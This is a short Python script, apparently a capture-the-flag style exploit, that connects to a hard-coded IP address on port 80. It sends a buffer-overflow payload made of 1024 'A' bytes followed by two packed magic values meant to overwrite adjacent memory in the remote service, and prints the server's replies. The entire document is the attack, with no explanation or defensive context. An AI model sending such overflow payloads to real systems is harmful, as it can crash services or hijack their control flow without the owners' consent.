
```python
import socket
import struct
HOST = '52.197.128.90'
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(8)
bc = bytes(('A'.encode('ascii'))*1024) +  struct.pack('<HH',0xc0fe,0xbe51)
print(bc)
print('[y]:', repr(data))
s.send(bc)
data = s.recv(1024)
print('[y]:', repr(data))
data = s.recv(1024)
s.close()
print('[y]:', repr(data))
```
